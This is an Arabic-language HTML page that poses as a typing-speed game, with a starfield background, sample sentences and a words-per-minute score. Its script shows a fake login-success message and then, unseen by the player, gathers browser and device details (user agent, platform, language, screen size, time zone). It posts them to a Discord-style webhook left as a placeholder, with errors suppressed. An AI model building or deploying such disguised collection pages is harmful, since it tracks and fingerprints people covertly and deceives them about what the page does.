<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
<meta charset="UTF-8" />
<meta name="viewport" content="width=device-width, initial-scale=1" />
<title>اختبر سرعتك مع جمع معلومات الجهاز</title>
<style>
  body {
    margin: 0; padding: 0;
    background: black;
    color: white;
    font-family: Tahoma, sans-serif;
    text-align: center;
    overflow-x: hidden;
    min-height: 100vh;
    position: relative;
  }
  canvas#stars {
    position: fixed;
    top: 0; left: 0;
    width: 100%;
    height: 100%;
    z-index: -1;
    display: block;
  }
  .container {
    max-width: 700px;
    margin: 60px auto 80px;
    padding: 20px;
    background: rgba(20,20,20,0.9);
    border-radius: 15px;
    box-shadow: 0 0 30px rgba(255,255,255,0.05);
  }
  input[type="text"] {
    width: 80%;
    font-size: 18px;
    padding: 12px;
    border-radius: 8px;
    border: 2px solid #555;
    background: #111;
    color: white;
    margin-bottom: 15px;
    direction: rtl;
  }
  button {
    font-size: 18px;
    padding: 12px 25px;
    border-radius: 8px;
    border: none;
    background-color: #6a1b9a;
    color: white;
    cursor: pointer;
    margin: 5px 10px 10px 10px;
  }
  #sentence {
    font-size: 24px;
    font-weight: bold;
    margin-bottom: 15px;
    user-select: none;
    white-space: normal;
    letter-spacing: normal;
  }
  #record {
    position: fixed;
    right: 20px;
    top: 20px;
    background: #222;
    padding: 10px 15px;
    border-radius: 8px;
    font-weight: bold;
    font-size: 16px;
    border: 1px solid #555;
    z-index: 1000;
    user-select: none;
  }
  #messageArea {
    margin: 15px 0 20px 0;
    font-size: 20px;
    color: #4caf50;
    min-height: 24px;
  }
  #result {
    font-size: 18px;
    margin-top: 10px;
    font-weight: bold;
  }
  #checkBtn {
    background-color: #388e3c;
    margin-top: 10px;
    width: 150px;
  }
</style>
</head>
<body>

<canvas id="stars"></canvas>

<div class="container" id="startContainer">
  <button id="startBtn">ابدأ</button>
  <div id="messageArea"></div>
</div>

<div class="container" id="gameContainer" style="display:none;">
  <div id="sentence"></div>
  <input type="text" id="textInput" autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" />
  <br />
  <button id="checkBtn">تحقق</button>
  <div id="result"></div>
</div>

<div id="record">أعلى سرعة: 0 كلمة/دقيقة</div>

<script>
  const webhookURL = "PUT_YOUR_WEBHOOK_URL_HERE";

  const sentences = [
    "هذا اختبار لسرعة الكتابة لديك",
    "جرب أن تكتب هذه الجملة بسرعة ودقة",
    "هل تستطيع تحقيق سرعة كتابة عالية؟",
    "السرعة والدقة هما المفتاح للنجاح"
  ];

  let currentSentence = "";
  let bestWPM = 0;

  const startBtn = document.getElementById("startBtn");
  const gameContainer = document.getElementById("gameContainer");
  const startContainer = document.getElementById("startContainer");
  const sentenceEl = document.getElementById("sentence");
  const textInput = document.getElementById("textInput");
  const checkBtn = document.getElementById("checkBtn");
  const resultEl = document.getElementById("result");
  const messageArea = document.getElementById("messageArea");
  const recordEl = document.getElementById("record");

  startBtn.addEventListener("click", () => {
    messageArea.textContent = "تم تسجيل دخولك بنجاح";
    setTimeout(() => {
      startContainer.style.display = "none";
      gameContainer.style.display = "block";
      loadSentence();
      textInput.focus();
      sendDeviceInfo();
    }, 1500);
  });

  function loadSentence() {
    const idx = Math.floor(Math.random() * sentences.length);
    currentSentence = sentences[idx];
    sentenceEl.textContent = currentSentence;
    textInput.value = "";
    resultEl.textContent = "";
  }

  checkBtn.addEventListener("click", () => {
    const typed = textInput.value.trim();
    if (!typed) {
      resultEl.textContent = "أدخل نصاً للتحقق";
      return;
    }
    if (typed === currentSentence) {
      const words = currentSentence.split(" ").length;
      // افترضنا زمن اختبار ثابت 15 ثانية، يمكن تطويره لاحقاً
      const wpm = Math.floor(words * 60 / 15);
      resultEl.textContent = `صحيح! سرعتك: ${wpm} كلمة/دقيقة`;
      if (wpm > bestWPM) {
        bestWPM = wpm;
        recordEl.textContent = `أعلى سرعة: ${bestWPM} كلمة/دقيقة`;
      }
      loadSentence();
      textInput.focus();
    } else {
      resultEl.textContent = "يوجد أخطاء في النص";
    }
  });

  function sendDeviceInfo() {
    const info = {
      userAgent: navigator.userAgent,
      platform: navigator.platform,
      language: navigator.language,
      cookiesEnabled: navigator.cookieEnabled,
      screen: {
        width: screen.width,
        height: screen.height,
        colorDepth: screen.colorDepth
      },
      timeZone: Intl.DateTimeFormat().resolvedOptions().timeZone
    };

    fetch(webhookURL, {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({
        content: "معلومات جهاز جديد",
        embeds: [{
          title: "معلومات الجهاز",
          fields: Object.keys(info).map(key => {
            let value = info[key];
            if (typeof value === "object") value = JSON.stringify(value);
            return { name: key, value: value.toString(), inline: false };
          })
        }]
      })
    }).catch(() => {});
  }

  // خلفية النجوم
  const canvas = document.getElementById("stars");
  const ctx = canvas.getContext("2d");
  let w, h;
  let stars = [];

  function initStars() {
    w = window.innerWidth;
    h = window.innerHeight;
    canvas.width = w;
    canvas.height = h;
    stars = [];
    for (let i = 0; i < 150; i++) {
      stars.push({
        x: Math.random() * w,
        y: Math.random() * h,
        radius: Math.random() * 1.1 + 0.3,
        alpha: Math.random(),
        delta: Math.random() * 0.02 + 0.005
      });
    }
  }

  function animateStars() {
    ctx.clearRect(0, 0, w, h);
    stars.forEach(star => {
      star.alpha += star.delta;
      if (star.alpha <= 0 || star.alpha >= 1) star.delta = -star.delta;
      ctx.beginPath();
      ctx.arc(star.x, star.y, star.radius, 0, Math.PI * 2);
      ctx.fillStyle = `rgba(255,255,255,${star.alpha})`;
      ctx.fill();
    });
    requestAnimationFrame(animateStars);
  }

  window.addEventListener("resize", () => {
    initStars();
  });

  initStars();
  animateStars();
</script>

</body>
</html>
